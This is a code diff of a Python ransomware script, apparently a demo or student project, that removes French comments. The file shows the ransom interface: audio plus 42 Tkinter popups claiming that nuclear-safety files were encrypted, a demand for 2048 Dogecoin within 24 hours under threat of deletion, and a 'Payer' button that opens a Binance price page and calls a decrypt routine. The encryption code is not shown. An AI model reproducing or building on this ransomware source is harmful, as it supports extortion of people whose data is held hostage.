@@ -8,7 +8,7 @@ def link():
     webbrowser.open("https://www.binance.com/fr/price/dogecoin")
 
     for popup in popups:
-        if popup.winfo_exists():  # Cas où la victime a fermé des fenêtres
+        if popup.winfo_exists():
             popup.destroy()
 
     decrypt_main()
@@ -34,21 +34,18 @@ def show_popup():
     screen_width = 1920
     screen_height = 1080
     global popups
-    popups = [] #Liste des pop-up à générer
+    popups = []
 
     for _ in range(42):
         play_audio()
 
-        # On ouvre une fenêtre
         popup = tk.Tk()
         popup.title("ALERT MESSAGE")
 
-        # On ajoute un p'tit message
         message = "Nous avons chiffré votre dossier_confidentiel contenant: \n -Rapport_Sensibilite_Securite_Nucleaire.docx\n -Données_Surveillance_Risques_Nucleaires.xlsx\n Afin de récupérer vos données, vous devez payer une rançon d'une valeur de 2048 Dogecoin. \n Vous avez 24 heures avant suppression définitive de vos données."
         label = tk.Label(popup, text=message, padx=20, pady=20)
         label.pack()
-
-        # On créer un boutton pour payer
+        
         link_button = tk.Button(popup, text="Payer", command=link, padx=10, pady=5)
         link_button.pack()
 
